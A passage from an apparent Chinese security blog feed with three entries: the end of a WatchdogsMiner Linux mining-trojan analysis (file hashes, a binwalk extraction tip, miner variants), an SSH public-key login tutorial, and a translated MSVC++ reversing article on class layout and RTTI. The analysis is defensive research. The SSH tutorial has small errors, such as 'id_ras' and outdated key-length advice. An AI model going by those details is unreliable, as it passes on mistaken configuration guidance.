class="literal">null</span>,</div><div class="line">    <span class="attr">"watch"</span>: <span class="literal">false</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>相关文件的 MD5 如下：</p>
<blockquote>
<p>a5d6916fdfac60e680681f960430c6b5  config.json<br>510f8ee9e4195b0d35ed6daaf0bdb3b1  miner_ksoftirqds_32bit<br>e160cbeb74612cfbf0e1bdcf2d0038f3  miner_ksoftirqds_32bit.gz<br>a48f529646b8b5e96bab67d6d517a975  miner_ksoftirqds_64bit<br>a0bbd10da4aa1426ca42801b948372b9  miner_ksoftirqds_64bit.gz<br>86e2f5859ca276f307a034b5c7c450f1  miner_ksoftirqds_64bit_unpacked<br>877a282eb09d8f88ae29cd6b332ab90c  miner_ksoftirqds__32bit_unpacked</p>
</blockquote>
<p><strong>后记</strong></p>
<p>跟同行大佬私下聊，说通过 <strong>binwalk</strong> 也可以直接把里面的文件提取出来。我试了下，可行，而且可以提取出总共 4 个 gzip 文件(除了矿机程序和矿机配置文件，还有另外两个文件也被做了同样的处理)。有兴趣的朋友可以自己探索一下：</p>
<p><img src="/imgs/watchdogs_binwalk_gzipfilelist.png" alt=""></p>
<p>但是有一点需要说明，这个 case 中，恰好是把这些目标文件压缩成 gzip 格式，然后打包进 ELF 木马文件中，而 binwalk 恰好可以识别二进制程序中的 gzip 文件格式。如果别的 Case 中，木马作者把要打包的文件做了 binwalk 无法识别的编码，那么就难以用 binwalk 直接提取了。</p>
<p>所以，本文提供的只是一个通用但算是 Hard Way 的静态分析手法达到提取文件的目标，仅供参考。</p>
<p>另外，综合几家的分析报告，以及同行大佬私下讨论，可以推测 Watchdogs 木马启用了 2 款矿机程序：</p>
<ol>
<li>一个是<a href="https://mp.weixin.qq.com/s/3jdtIRIFFPrVnWSU1K99lg" target="_blank" rel="external">默安科技最新的分析报告</a>中提到的， XMR-Stak 编译而来，挖矿配置硬编码在矿机程序中，xmr 钱包地址分支是 .tenx；</li>
<li>另一个是本文中提到的，XMRig 编译来的矿机，挖矿配置是打包在主样本中的 config.json 文件，xmr 钱包地址分支是 .teny。 </li>
</ol>
<p>xmr-stak 和 xmrig 两个矿机程序的配置文件格式和内容有所不同，可以用来辅助分析：</p>
<ul>
<li>xmr-stak 的默认配置文件： <a href="https://github.com/fireice-uk/xmr-stak-cpu/blob/master/config.txt" target="_blank" rel="external">https://github.com/fireice-uk/xmr-stak-cpu/blob/master/config.txt</a></li>
<li>xmrig 的默认配置文件： <a href="https://github.com/xmrig/xmrig/blob/master/src/config.json" target="_blank" rel="external">https://github.com/xmrig/xmrig/blob/master/src/config.json</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这周末爆发的新型 Linux 挖矿木马 WatchdogsMiner，有两家厂商分析的挺详细，尤其是腾讯云鼎实验室的分析，全面而深入。看完他们的的分析很有收获，也才发现这个 WatchdogsMiner 比之前想象的复杂一些：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;腾讯云鼎： &lt;a href=&quot;https://mp.weixin.qq.com/s/3V0HVEREZWU8SkRWLspaxg&quot;&gt;事件分析 | Linux watchdogs 感染性隐藏挖矿病毒入侵还原录&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;深信服： &lt;a href=&quot;https://mp.weixin.qq.com/s/dwY--BLzcyeXqPUZlhb__Q&quot;&gt;紧急预警！WatchDogsMiner挖矿蠕虫大量感染Linux服务器&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;但是有一个参与此次木马应急响应的朋友指出：里面有个关键的挖矿模块 &lt;code&gt;/tmp/ksoftirqds&lt;/code&gt; ，目前公开的分析文章中看他们并没有提到捕获的细节(当然，不是说他们没有搞定这一点，只是没在文中提及细节)。&lt;/p&gt;
&lt;p&gt;说的也是，既然是&lt;strong&gt;挖矿木马&lt;/strong&gt;，个人认为分析的时候要重点关注 3 个要素：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;矿机程序(Hash 值、由什么开源矿机编译而来、版本等等）；&lt;/li&gt;
&lt;li&gt;挖矿配置（挖矿账号、矿池地址，有的还有自建挖矿代理服务器）；&lt;/li&gt;
&lt;li&gt;挖矿收益（可选，因为在某些情况下查不到）。&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="re" scheme="http://jiayu0x.com/tags/re/"/>
    
      <category term="miner" scheme="http://jiayu0x.com/tags/miner/"/>
    
  </entry>
  
  <entry>
    <title>SSH 公钥登录配置详解(iTerm2 为例)</title>
    <link href="http://jiayu0x.com/2017/11/22/ssh-pubkey-auth/"/>
    <id>http://jiayu0x.com/2017/11/22/ssh-pubkey-auth/</id>
    <published>2017-11-21T16:00:00.000Z</published>
    <updated>2019-11-15T02:02:41.244Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>SSH 服务的远程登录服务方式，通常有<strong>密码登录</strong>和<strong>公钥登录</strong>两种。公钥登录方式的好处就不赘述了，本文详解 SSH 公钥登录的配置过程，以及其中常见的坑。<br><strong>Note</strong>：本文所有实验均在 Mac 下的 iTerm2 中操作。</p>
</blockquote>
<p>配置单个主机的 SSH 公钥登录，步骤非常简单，三步即可：</p>
<ol>
<li>生成密钥对</li>
<li>拷贝公钥文件到服务器</li>
<li>SSH 直接公钥登录服务器</li>
</ol>
<a id="more"></a>
<h2 id="步骤详解"><a href="#步骤详解" class="headerlink" title="步骤详解"></a>步骤详解</h2><h3 id="ssh-keygen-生成密钥对"><a href="#ssh-keygen-生成密钥对" class="headerlink" title="ssh-keygen 生成密钥对"></a>ssh-keygen 生成密钥对</h3><p><strong>ssh-keygen</strong> 命令可以按照指定的参数生成密钥对，其常用的参数有以下几个：</p>
<blockquote>
<p><strong>-t</strong> ： 加密算法，可选 [dsa | ecdsa | ed25519 | rsa]；<br><strong>-b</strong> ：密钥长度（256/512/1024/2048……）,建议至少1024；<br><strong>-f</strong> ： 输出的密钥对文件名；<br><strong>-N</strong> ：密钥口令。</p>
</blockquote>
<p>比如我要为 <strong>test</strong> 主机生成一对密钥文件，密钥长度 2048、加密算法 RSA，就可以用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">~ ➜ ssh-keygen <span class="_">-f</span> <span class="built_in">test</span> -t rsa -b 2048</div></pre></td></tr></table></figure>
<p>执行此命令会提示 <code>Enter passphrase (empty for no passphrase):</code>，如果需要密钥口令，就要填上并记下来，如果不需要就直接摁回车键直到结束。命令执行完成后，会在当前目录生成两个文件：私钥文件 <strong>test</strong> 和 公钥文件 <strong>test.pub</strong> 。如果不指定 <code>ssh-keygen</code> 命令的 <strong>-f</strong> 参数，则会默认生成 <strong>~/.ssh/id_ras</strong> 和 <strong>~/.ssh/id_ras.pub</strong> 两个文件 。</p>
<h3 id="ssh-copy-id-拷贝公钥到服务器"><a href="#ssh-copy-id-拷贝公钥到服务器" class="headerlink" title="ssh-copy-id 拷贝公钥到服务器"></a>ssh-copy-id 拷贝公钥到服务器</h3><p><strong>ssh-copy-id</strong> 命令负责把上述步骤生成的公钥文件内容拷贝到服务器，确切说，是把 <strong>xxx.pub</strong> 文件中的内容<strong>附加</strong>到服务器端的 <code>~/.ssh/authorized_keys</code> 文件中。</p>
<p>ssh-copy-id 命令使用方式如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">~ ➜ ssh-copy-id [-i &lt;identityfile&gt;] [-p &lt;port&gt;] [username@]hostname</div></pre></td></tr></table></figure>
<p>其中 <code>-i</code> 即指定上述步骤生成的密钥对中的 <strong>公钥文件</strong>，意思是把公钥文件 <strong>xxx.pub</strong> 传到服务端 <code>hostname</code>，把 <strong>xxx.pub</strong> 中的内容附加到 <code>hostname:/home/username/.ssh/authorized_keys</code> 文件中。如果不用 <code>-i</code> 指定公钥文件，则默认指定 <strong>id_ras.pub</strong> 。</p>
<p>举例来说，我想通过公钥登录我 <code>192.168.1.2</code> 上的 <code>jiayu</code> 账户，那么只需把上述步骤中生成的 <strong>test.pub</strong> 文件上传到该服务器即可：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">~ ➜ ssh-copy-id -i <span class="built_in">test</span> jiayu@192.168.1.2</div></pre></td></tr></table></figure>
<p>运行这条命令会让输入一次账户密码，然后才能成功上传到服务端。</p>
<p>另外，还有好多人在这一步会舍弃 <code>ssh-copy-id</code> 命令，转而手动上传公钥文件到服务端，然后 <code>cat xxx.pub &gt;&gt; ~/.ssh/authorized_keys</code> ，个人不提倡这种做法， <code>ssh-copy-id</code> 这条专用命令就是为了免去麻烦又容易失误的手动操作。</p>
<h3 id="直接登录远程服务器"><a href="#直接登录远程服务器" class="headerlink" title="直接登录远程服务器"></a>直接登录远程服务器</h3><p>经过上面两步骤，没什么意外的话就可以用密钥登录远程服务器了。不过这里还有个小细节需要说一下，我们平时用密码 SSH 登录远程服务器，是用 <code>ssh username@host -p &lt;port&gt;</code> 命令然后输入密码。如果我们只有一台远程服务器需要用 SSH 公钥登录的方式，那么最初执行 ssh-keygen 命令的时候就可以不指定 <code>-f</code> 参数，默认生成密钥对文件 <strong>id_ras/id_isa.pub</strong> ，然后执行命令 <code>ssh username@host -p &lt;port&gt;</code> 不用输入密码即可登录，SSH 命令会默认调用 <strong>id_rsa</strong> 尝试连接。</p>
<p>但如果执行 ssh-keygen 命令的时候指定了 <strong>-f test</strong> 参数，那么这时要登录远程服务器就要在 SSH 命令中也指定私钥文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">~ ➜ ssh -i <span class="built_in">test</span> jiayu@192.168.1.2</div></pre></td></tr></table></figure>
<p>成功登录，配置完成，即可删除本地的公钥文件 xxx.pub，只留下相应的私钥文件。</p>
<h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><p>有的朋友会发现，严格按照上述步骤操作，也无法成功连接服务端。此处常见的坑有 2 个：</p>
<ol>
<li>服务端 <code>~/.ssh/</code> 目录和 <code>~/.ssh/authorized_keys</code> 文件的权限问题；</li>
<li>服务端 <code>~/.ssh/authorized_keys</code> 文件内容格式问题。</li>
</ol>
<h3 id="服务端相关目录和文件权限"><a href="#服务端相关目录和文件权限" class="headerlink" title="服务端相关目录和文件权限"></a>服务端相关目录和文件权限</h3><p>个人见过的情况，把服务端  <code>~/.ssh/</code>  目录权限设置为 <strong>700</strong> ，把  <code>~/.ssh/authorized_keys</code> 文件权限设置为 <strong>600</strong> 即可。</p>
<h3 id="authorized-keys-中-pubkey-内容要换行"><a href="#authorized-keys-中-pubkey-内容要换行" class="headerlink" title="authorized_keys 中 pubkey 内容要换行"></a>authorized_keys 中 pubkey 内容要换行</h3><p>有时候，服务端 SSH 目录和文件权限都没问题，仍然连接失败。此时给 SSH 命令启用 <code>-v</code> 选项打出连接时的详细信息，会发现客户机已经把私钥发送到服务器端，但在服务器端没有验证成功。</p>
<p>并且，在服务端的 SSH 服务日志 <code>/var/log/secure</code> 文件中可以查到类似以下内容的错误信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">error: key_read: uudecode AAAAB3N failed</div></pre></td></tr></table></figure>
<p>此时就是服务端 <code>~/.ssh/authorized_keys</code> 文件内容格式出了问题。根源在于 <code>ssh-copid</code> 命令默认把公钥文件内容直接附加到服务端 <code>authorized_keys</code> 末尾，而<strong>没有换行</strong>。</p>
<p>解决方案也很简单：Vim 打开服务端 <code>~/.ssh/authorized_keys</code> 文件，为每个 pubkey 内容手动隔开一行即可。</p>
<h2 id="配置多服务器多公钥登录"><a href="#配置多服务器多公钥登录" class="headerlink" title="配置多服务器多公钥登录"></a>配置多服务器多公钥登录</h2><p>前面举的例子都是针对单一服务器 SSH 公钥登录配置，如果我有多台服务器都需要配置成 SSH 公钥登录，该怎么配置？</p>
<p>这里有个便捷的方式，两步即可完成配置：</p>
<ol>
<li>为每台服务器按照上面的 <strong>三步走</strong> 生成密钥对文件，配置 SSH 公钥登录后，整理好本地所有的私钥文件，最好所有的私钥文件统一放到同一目录下，比如 <code>~/.ssh/priKeys/</code> ；</li>
<li>编写本地 SSH 配置文件： <code>~/.ssh/config</code> </li>
</ol>
<p>假如我的服务端主机与<strong>主机别名</strong>（方便自己记忆而起的别名）列表如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">192.168.120.1    jiayu1</div><div class="line">192.168.120.2    jiayu2</div><div class="line">192.168.110.3    jiayu3</div><div class="line">192.168.110.4    jiayu4</div></pre></td></tr></table></figure>
<p>那么我的本地 <code>~/.ssh/config</code> 文件配置如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">Host jiayu1                               #别名</div><div class="line">Hostname 192.168.120.1                    #服务器地址</div><div class="line">Port 22                                   #服务器 SSH 服务端口</div><div class="line">User root                                 #服务端的用户名</div><div class="line">IdentityFile ~/.ssh/priKeys/jiayutest1    #对应本地的私钥文件路径</div><div class="line"></div><div class="line">Host jiayu2</div><div class="line">Hostname 192.168.120.2</div><div class="line">Port 22</div><div class="line">User root</div><div class="line">IdentityFile ~/.ssh/priKeys/jiayutest2</div><div class="line"></div><div class="line">Host jiayu3</div><div class="line">Hostname 192.168.110.3</div><div class="line">Port 22</div><div class="line">User root</div><div class="line">IdentityFile ~/.ssh/priKeys/jiayutest3</div><div class="line"></div><div class="line">Host jiayu4</div><div class="line">Hostname 192.168.110.4</div><div class="line">Port 22</div><div class="line">User root</div><div class="line">IdentityFile ~/.ssh/priKeys/jiayutest4</div></pre></td></tr></table></figure>
<p>各配置项的意义见上面的注释内容，这样一来，我就可以用 <strong>主机别名</strong> 直接登录远程服务器了。比如通过 SSH 公钥登录 <code>root@192.168.110.4</code> ，以下命令即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">~ ➜ ssh jiayu4</div></pre></td></tr></table></figure>
<p>这样，ssh 命令会自动根据 <code>~/.ssh/config</code> 中的配置项，寻找到 <code>jiayutest</code> 这一个私钥文件，然后拿它去登录 <code>root@192.168.110.4</code> 。</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;SSH 服务的远程登录服务方式，通常有&lt;strong&gt;密码登录&lt;/strong&gt;和&lt;strong&gt;公钥登录&lt;/strong&gt;两种。公钥登录方式的好处就不赘述了，本文详解 SSH 公钥登录的配置过程，以及其中常见的坑。&lt;br&gt;&lt;strong&gt;Note&lt;/strong&gt;：本文所有实验均在 Mac 下的 iTerm2 中操作。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;配置单个主机的 SSH 公钥登录，步骤非常简单，三步即可：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;生成密钥对&lt;/li&gt;
&lt;li&gt;拷贝公钥文件到服务器&lt;/li&gt;
&lt;li&gt;SSH 直接公钥登录服务器&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="system" scheme="http://jiayu0x.com/categories/system/"/>
    
    
      <category term="ssh" scheme="http://jiayu0x.com/tags/ssh/"/>
    
      <category term="pubkey" scheme="http://jiayu0x.com/tags/pubkey/"/>
    
      <category term="公钥认证" scheme="http://jiayu0x.com/tags/%E5%85%AC%E9%92%A5%E8%AE%A4%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>(译)MSVC++ 逆向（二）—— 类、方法和 RTTI</title>
    <link href="http://jiayu0x.com/2017/04/30/reversing-msvcxx-exception-handling-2/"/>
    <id>http://jiayu0x.com/2017/04/30/reversing-msvcxx-exception-handling-2/</id>
    <published>2017-04-29T16:00:00.000Z</published>
    <updated>2017-05-04T13:48:47.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>原文： <a href="http://www.openrce.org/articles/full_view/23" target="_blank" rel="external">http://www.openrce.org/articles/full_view/23</a></p>
</blockquote>
<p>这是本系列第二篇（第一篇 👉： <a href="http://jiayu0x.com/2017/04/25/reversing-msvcxx-exception-handling/">MSVC++ 逆向(1)——异常处理</a> ），本篇将介绍 MSVC 中实现的 C++ 底层机制，包括逆向过程中的 <strong>类结构内存布局</strong>、<strong>虚函数</strong>、<strong>RTTI</strong>（<strong>Run-Time Type Information</strong>，运行时类型识别）。阅读本文需要有 C++ 基础知识以及汇编和逆向相关基础。</p>
<a id="more"></a>
<h2 id="类的内存布局基础"><a href="#类的内存布局基础" class="headerlink" title="类的内存布局基础"></a>类的内存布局基础</h2><p>为了方便阐述接下来的内容，先看一段简单的 C++ 代码示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">class</span> A</div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> a1;</div><div class="line"><span class="keyword">public</span>:</div><div class="line">      <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">A_virt1</span><span class="params">()</span></span>;</div><div class="line">      <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">A_virt2</span><span class="params">()</span></span>;</div><div class="line">      <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">A_static1</span><span class="params">()</span></span>;</div><div class="line">      <span class="function"><span class="keyword">void</span> <span class="title">A_simple1</span><span class="params">()</span></span>;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">class</span> B</div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> b1;</div><div class="line">    <span class="keyword">int</span> b2;</div><div class="line"><span class="keyword">public</span>:</div><div class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">B_virt1</span><span class="params">()</span></span>;</div><div class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">B_virt2</span><span class="params">()</span></span>;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">class</span> C: <span class="keyword">public</span> A, <span class="keyword">public</span> B</div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> c1;</div><div class="line"><span class="keyword">public</span>:</div><div class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">A_virt2</span><span class="params">()</span></span>;</div><div class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">B_virt2</span><span class="params">()</span></span>;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>多数情况下 MSVC++ 的 <strong>类</strong> 中个元素在内存布局中的顺序如下：</p>
<ul>
<li>指向<strong>虚函数表</strong>的<strong>指针</strong>（ <code>_vtable_</code> 或者 <code>_vftable_</code> ），仅当类中有<strong>虚函数</strong>、并且<strong>基类</strong>中没有相应的<strong>虚函数表</strong>的时候才有此指针元素；</li>
<li>基类</li>
<li>类成员</li>
</ul>
<p><strong>虚函数表</strong>中囊括了类中的各个<strong>虚函数</strong>，以虚函数声明的顺序排列。其中，<strong>重载函数</strong> 的 <strong>地址</strong> 覆盖基类中相应函数的地址。如此一来，上面 3 个类在内存中的布局大概如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">class A size(8)</div><div class="line">       +---</div><div class="line">    0  | &#123;vfptr&#125;</div><div class="line">    4  | a1</div><div class="line">       +---</div><div class="line"></div><div class="line">A&apos;s vftable:</div><div class="line">    0  | &amp;A::A_virt1</div><div class="line">    4  | &amp;A::A_virt2</div><div class="line">-----------------------</div><div class="line"></div><div class="line">class B size(12):</div><div class="line">        +---</div><div class="line">    0   | &#123;vfptr&#125;</div><div class="line">    4   | b1</div><div class="line">    8   | b2</div><div class="line">        +---</div><div class="line"></div><div class="line">B&apos;s vftable:</div><div class="line">    0   | &amp;B::B_virt1</div><div class="line">    4   | &amp;B::B_virt2</div><div class="line">-----------------------</div><div class="line"></div><div class="line">class C size(24):</div><div class="line">         +---</div><div class="line">         | +--- (base class A)</div><div class="line">    0    | | &#123;vfptr&#125;</div><div class="line">    4    | | a1</div><div class="line">         | +---</div><div class="line">         | +--- (base class B)</div><div class="line">    8    | | &#123;vfptr&#125;</div><div class="line">    12   | | b1</div><div class="line">    16   | | b2</div><div class="line">         | +---</div><div class="line">    20   | c1</div><div class="line">         +---</div><div class="line"></div><div class="line">C&apos;s vftable for A:</div><div class="line">    0   | &amp;A::A_virt1</div><div class="line">    4   | &amp;C::A_virt2</div><div class="line"></div><div class="line">C&apos;s vftable for B:</div><div class="line">    0   | &amp;B::B_virt1</div><div class="line">    4   | &amp;C::B_virt2</div></pre></td></tr></table></figure>
<p>上面的图表是在 VC8 中用一个文档中没说明的编译选项生成的，对于编译器产生的类内存布局图表，用 <code>-d1reportSingleClassLayout</code> 编译选项可以查看单个类的布局图表；用 <code>-d1reportAllClassLayout</code> 可以查看所有类的内存布局（包括内部的 CRT 类），布局图表会在 <code>stdout</code> 中输出。</p>
<p>从上面编译器生成的图表可以看出，类 <code>C</code> 里有两个 <strong>虚函数表</strong>，这是因为它继承了两个基类，而两个基类均有自己的虚函数成员。在类 C 的第一个虚函数表中，虚函数 <code>C::A_virt2()</code> 的地址覆盖了基类 A 在 C 中派生的 <code>A_virt2()</code> 的地址；类似地，在类 C 的第二个虚函数表中，虚函数 <code>C::B_virt2()</code> 的地址覆盖了基类 B 在 C 中派生的 <code>B_virt2()</code> 的地址。</p>
<h2 id="调用约定与类方法"><a href="#调用约定与类方法" class="headerlink" title="调用约定与类方法"></a>调用约定与类方法</h2><p>MSVC++ 中的类方法调用时，默认遵守 <code>_thiscall_</code> 调用约定。通过类的对象调用<strong>非静态成员函数</strong>或<strong>非全局函数时</strong>，类的对象自身的地址（即 <code>*this</code> 指针的值）会以<strong>隐含参数</strong>的形式传递给被调用的类的成员函数，通常，这个 <code>*this</code> 指针的值，存储在寄存器 <code>ecx</code> 中。在函数体的实现中，编译器通常把这个指针值塞在其他寄存器中（比如 <code>esi</code> 或 <code>edi</code> ），或者直接存入栈中的某个变量，然后对其他所有类成员的访问，都基于这个地址进行相对寻址来实现。然而，当实现 <code>COM</code> 类的时候，对类成员函数的调用则遵循 <code>_stdcall_</code> 的调用约定。下面详述几种不同的类成员方法调用时的底层细节：</p>
<h3 id="1-静态成员函数"><a href="#1-静态成员函数" class="headerlink" title="1) 静态成员函数"></a>1) 静态成员函数</h3><p>调用<strong>静态成员函数</strong>不需要类的实例对象，可以直接通过类名来调用，在底层看来就跟调用普通非成员函数差不多，并不涉及 <code>*this</code> 指针的隐式传递。不过，也正因如此，逆向过程中不容易区分类的静态成员函数和普通的非成员函数。比如：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A::A_static1();</div><div class="line">call    A::A_static1</div></pre></td></tr></table></figure>
<h3 id="2-普通成员函数"><a href="#2-普通成员函数" class="headerlink" title="2) 普通成员函数"></a>2) 普通成员函数</h3><p><strong>普通成员函数</strong>的调用，就需要通过类的实例对象来调用了，这种情况下 <code>*this</code> 指针会以隐含参数的形式作为被调函数的第一个参数传递进去，并遵循 <code>_thiscall_</code> 调用约定，在底层会存储在 <code>ecx</code> 寄存器中。另外，如果存在类继承的情况，基类对象的地址可能与派生类的对象的地址不同，这时候如果在派生类的对象中调用基类的成员函数， <code>*this</code> 指针的值需要调整到<strong>基类对象</strong>的起始地址，然后才能调用基类中的普通成员函数。示例如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">;pC-&gt;A_simple1(1);</span></div><div class="line"><span class="comment">;esi = pC</span></div><div class="line"><span class="keyword">push</span>    <span class="number">1</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">esi</span></div><div class="line"><span class="keyword">call</span>    A::A_simple1</div><div class="line"></div><div class="line"><span class="comment">;pC-&gt;B_simple1(2,3);</span></div><div class="line"><span class="comment">;esi = pC</span></div><div class="line"><span class="keyword">lea</span> <span class="built_in">edi</span>, [<span class="built_in">esi</span>+<span class="number">8</span>] <span class="comment">;调整 *this 指针的值</span></div><div class="line"><span class="keyword">push</span>    <span class="number">3</span></div><div class="line"><span class="keyword">push</span>    <span class="number">2</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">edi</span></div><div class="line"><span class="keyword">call</span>    B::B_simple1</div></pre></td></tr></table></figure>
<p>如上所示，在调用 <code>B</code> 类的成员函数之前， <code>*this</code> 指针的值调整为 <code>B</code> 类子对象的起始地址。</p>
<h3 id="3-虚函数"><a href="#3-虚函数" class="headerlink" title="3) 虚函数"></a>3) 虚函数</h3><p>为了调用<strong>虚函数</strong>，编译器首先需要从<strong>虚函数表</strong>中取出相应虚函数的起始地址，然后就按照类似普通成员函数调用的方式去调用它（把 <code>*this</code> 指针以隐含参数的方式传递），示例如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">;pC-&gt;A_virt2()</span></div><div class="line"><span class="comment">;esi = pC</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">esi</span>]  <span class="comment">;获取虚函数表的地址</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">esi</span></div><div class="line"><span class="keyword">call</span> [<span class="built_in">eax</span>+<span class="number">4</span>]  <span class="comment">;调用虚函数表中的第二个虚函数</span></div><div class="line"></div><div class="line"><span class="comment">;pC-&gt;B_virt1()</span></div><div class="line"><span class="comment">;edi = pC</span></div><div class="line"><span class="keyword">lea</span> <span class="built_in">edi</span>, [<span class="built_in">esi</span>+<span class="number">8</span>] <span class="comment">;调整 *this 指针的值</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">edi</span>]   <span class="comment">;获取虚函数表的地址</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">edi</span></div><div class="line"><span class="keyword">call</span> [<span class="built_in">eax</span>]       <span class="comment">;调用第一个虚函数</span></div></pre></td></tr></table></figure>
<h3 id="4-构造函数和析构函数"><a href="#4-构造函数和析构函数" class="headerlink" title="4) 构造函数和析构函数"></a>4) 构造函数和析构函数</h3><p><strong>构造函数</strong>和<strong>析构函数</strong>的调用过程，与普通成员函数类似。不同的是，即使按惯例来说构造函数并没有返回值，它仍然会把构造好的类的实例对象的起始地址隐式地返回（<code>return</code> 到寄存器 <code>eax</code> 中）。</p>
<h2 id="RTTI-的实现"><a href="#RTTI-的实现" class="headerlink" title="RTTI 的实现"></a>RTTI 的实现</h2><p><strong>RTTI</strong>（Run-Time Type Identification，<strong>运行时类型识别</strong>）是编译器为了支持 C++ 中 <code>dynamic_cast&lt;&gt;</code> 和 <code>typeid()</code> 两个操作符操作符以及 C++ 异常而生成的特殊编译信息。RTTI 的特性只有当类涉及<strong>多态</strong>的时候才会用到，比如类中声明了<strong>虚函数</strong>。</p>
